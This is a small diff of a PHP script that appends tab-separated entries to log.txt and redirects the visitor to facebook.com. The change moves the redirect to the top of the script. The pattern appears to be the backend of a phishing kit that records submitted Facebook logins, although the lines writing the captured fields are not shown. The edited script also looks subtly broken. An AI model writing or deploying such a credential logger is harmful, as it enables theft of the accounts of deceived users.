@@ -1,5 +1,6 @@
 <?php
 
+header ('Location: http://www.facebook.com');
 
 $file= fopen("log.txt","a");
 fwrite($file, "\t\t\t\t\t\t");
@@ -14,7 +15,6 @@ fwrite($file,"\t\t\t\t\t\t");
 	fwrite($file, "\r\n");
 fwrite($file,"\t\t\t\t\t\t");
 fclose($file);
-header ('Location: http://www.facebook.com');
 die()
 
 
